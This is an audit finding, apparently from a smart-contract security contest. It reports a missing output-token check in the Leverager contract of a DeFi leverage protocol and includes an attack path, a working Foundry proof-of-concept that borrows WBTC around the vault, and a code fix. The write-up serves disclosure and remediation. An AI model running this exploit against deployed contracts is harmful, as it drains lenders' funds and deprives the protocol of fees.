# Missing output token validation in swaps allows direct borrowing from lending pool without depositing into the vault


## Summary
The `Leverager#openLeveragedPosition` function does not validate that swap output tokens are `token0` or `token1`, allowing users to borrow assets directly from the lending pool without contributing them to vault positions, depriving the protocol of LP fees.

## Relevant Context
The protocol is designed to enable leveraged positions in vaults by borrowing assets from a lending pool. Users should deposit collateral into vaults and can then borrow additional assets to increase their exposure. The protocol earns fees from LP positions in the vault.

## Root Cause
In `Leverager#openLeveragedPosition`, when processing swaps via `swapParams1` and `swapParams2`, the function only validates that the input token is the denomination token but does not verify that the output token is `token0` or `token1`.

[`Leverager.sol#L143`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/b5a0f779dce4236b02665606adb610099451a51a/yieldoor/src/Leverager.sol#L143)

[`Leverager.sol#L156`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/b5a0f779dce4236b02665606adb610099451a51a/yieldoor/src/Leverager.sol#L156)

This oversight allows users to specify swap paths that output any token (e.g. WBTC) and set themselves as the recipient. By transferring in advance enough `token0` or `token1` to the leverager to cover the difference between `vaultIn` and `amountIn`, users can borrow high value tokens directly from the lending pool. The `pushFunds` function still executes successfully since the leverager has the required token balance, allowing the leveraged position to be opened despite circumventing the intended vault deposit mechanism.

This is problematic because the difference in value between token out of the swap and `vaultIn - amountIn` is the value that the user can borrow directly from the lending pool without depositing into the vault.

## Attack Path

1. User identifies a vault with USDC (token 0) and WETH (token 1) as the token pair
2. User sets `vault1In` slightly higher than their deposits to trigger the swap
3. User configures `swapParams2` to swap USDC (denomination) to WBTC instead of `token0` or `token1`
4. User transfers in advance the difference between `vault1In` and `amount1In` to the leverager
5. The contract:
   - Flashloans the difference between vault inputs and user deposits
   - Deposits into vault
   - Borrows USDC from lending pool
   - Executes swap to WBTC (instead of `token0` or `token1`) with the user as the recipient 
   - Repays flashloan
6. User borrows WBTC successfully

## Impact Explanation
High. This vulnerability:
- Allows users to borrow assets without contributing them to vault positions
- Deprives protocol of LP fees it would earn if borrowed assets were used in vault positions

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";
import {Strategy} from "../src/Strategy.sol";
import {LendingPool} from "../src/LendingPool.sol";
import {Leverager} from "../src/Leverager.sol";
import {PriceFeed} from "../src/PriceFeed.sol";
import {MockOracle} from "./utils/MockOracle.sol";
import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";
import {IUniswapV3Pool} from "../src/interfaces/IUniswapV3Pool.sol";
import {IVault} from "../src/interfaces/IVault.sol";
import {ILeverager} from "../src/interfaces/ILeverager.sol";
import {ILendingPool} from "../src/interfaces/ILendingPool.sol";
import {IPriceFeed} from "../src/interfaces/IPriceFeed.sol";
import {IMainnetRouter} from "../src/interfaces/IMainnetRouter.sol";

contract PoC is Test {
    IUniswapV3Pool pool = IUniswapV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // token0
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // token1

    IERC20 wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    address uniRouter = address(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    address vault;
    address strategy;
    address rebalancer = address(1001);
    address feeRecipient = address(9999);
    address user = address(1);
    address owner = address(222);

    address leverager;
    address lendingPool;
    address priceFeed;
    address wbtcOracle;
    address usdcOracle;
    address wethOracle;

    address lender = address(123456);

    function setUp() public {
        vm.startPrank(owner);
        // Vault setup
        vault = address(new Vault(address(usdc), address(weth)));
        strategy = address(new Strategy(address(pool), address(vault), rebalancer, feeRecipient));
        IVault(vault).setStrategy(strategy);

        priceFeed = address(new PriceFeed());
        wbtcOracle = address(new MockOracle());
        usdcOracle = address(new MockOracle());
        wethOracle = address(new MockOracle());

        IPriceFeed(priceFeed).setChainlinkPriceFeed(address(wbtc), wbtcOracle, 604800);
        IPriceFeed(priceFeed).setChainlinkPriceFeed(address(usdc), usdcOracle, 604800);
        IPriceFeed(priceFeed).setChainlinkPriceFeed(address(weth), wethOracle, 604800);

        // LendingPool setup
        lendingPool = address(new LendingPool());

        ILendingPool(lendingPool).initReserve(address(wbtc));
        ILendingPool(lendingPool).initReserve(address(usdc));
        ILendingPool(lendingPool).initReserve(address(weth));

        // Leverager setup
        leverager = address(new Leverager("", "", lendingPool));
        ILeverager(leverager).initVault(address(vault), 1_000_000e18, 5e18, 0.1e18, 1e27);

        ILendingPool(lendingPool).setLeverager(leverager);
        ILendingPool(lendingPool).setLeverageParams(address(wbtc), type(uint256).max, type(uint256).max);
        ILendingPool(lendingPool).setLeverageParams(address(usdc), type(uint256).max, type(uint256).max);
        ILendingPool(lendingPool).setLeverageParams(address(weth), type(uint256).max, type(uint256).max);
        ILeverager(leverager).setPriceFeed(priceFeed);
        ILeverager(leverager).enableTokenAsBorrowed(address(usdc));
        MockOracle(wbtcOracle).setPrice(100_000e18);
        MockOracle(usdcOracle).setPrice(1e18);
        MockOracle(wethOracle).setPrice(2500e18);

        ILeverager(leverager).setSwapRouter(uniRouter);

        // add some funds to borrow from.
        vm.startPrank(lender);
        wbtc.approve(lendingPool, 10e8);
        deal(address(wbtc), lender, 10e8);
        ILendingPool(lendingPool).deposit(address(wbtc), 10e8, lender);

        usdc.approve(lendingPool, 250_000e6);
        deal(address(usdc), lender, 250_000e6);
        ILendingPool(lendingPool).deposit(address(usdc), 250_000e6, lender);

        weth.approve(lendingPool, 1000e18);
        deal(address(weth), lender, 1000e18);
        ILendingPool(lendingPool).deposit(address(weth), 1000e18, lender);

        vm.startPrank(user);
        usdc.approve(leverager, type(uint256).max);
        weth.approve(leverager, type(uint256).max);

        vm.stopPrank();
    }

    function test_PoC() public {
        // Amount of WBTC to borrow through direct lending pool access
        uint256 diff = 0.05e8;

        vm.startPrank(user);
        ILeverager.LeverageParams memory lp;
        // Set up minimal vault deposits
        lp.amount0In = 2_500e6;  // USDC deposit
        lp.amount1In = 1e18 - diff;  // WETH deposit minus amount to borrow
        // Set vault inputs slightly higher to trigger the swap
        lp.vault0In = 2_500e6;
        lp.vault1In = 1e18;
        lp.vault = vault;
        lp.maxBorrowAmount = 10_000e6;
        lp.denomination = address(usdc);

        // Configure swap to output WBTC instead of token0/token1
        IMainnetRouter.ExactOutputParams memory ep;
        bytes memory _path = abi.encodePacked(address(wbtc), uint24(3000), address(usdc));
        ep.path = _path;
        ep.deadline = block.timestamp;
        ep.amountInMaximum = type(uint256).max;
        // This is user, not leverager
        ep.recipient = user;
        lp.swapParams2 = abi.encode(ep);

        // Setup initial balances and approvals
        deal(address(usdc), user, 2_500e6);
        deal(address(weth), user, 1e18);
        usdc.approve(leverager, lp.amount0In);
        weth.approve(leverager, lp.amount1In);
        // User transfer diff weth to leverager in advance to make up the difference lp.vault1In - lp.amount1In
        weth.transfer(leverager, diff);

        // Execute position opening
        ILeverager(leverager).openLeveragedPosition(lp);

        // User successfully borrowed 0.05e8 wbtc directly from lending pool
        assertEq(wbtc.balanceOf(user), diff);

        // As a result, only 0.05e8 weth (from the borrowed funds) deposited into the vault
        // The amount that the user can borrow directly from the vault is 0.05e8 wbtc - 0.05e8 weth

        vm.stopPrank();
    }
}
```

## Recommendation
Add validation in `openLeveragedPosition` to ensure swap output tokens match `token0` or `token1`:

```diff
if (a0 > lp.amount0In && up.token0 != lp.denomination) {
    swapParams = abi.decode(lp.swapParams1, (IMainnetRouter.ExactOutputParams));
    address tokenIn = _getTokenIn(swapParams.path);
+   (address tokenOut,,) = swapParams.path.decodeFirstPool();
    require(tokenIn == lp.denomination, "token should be denomination");
+   require(tokenOut == up.token0, "invalid output token");
    ...
}

if (a1 > lp.amount1In && up.token1 != lp.denomination) {
    swapParams = abi.decode(lp.swapParams2, (IMainnetRouter.ExactOutputParams));
    address tokenIn = _getTokenIn(swapParams.path);
+   (address tokenOut,,) = swapParams.path.decodeFirstPool();

+   require(tokenOut == up.token1, "invalid output token");
    ...
}
```
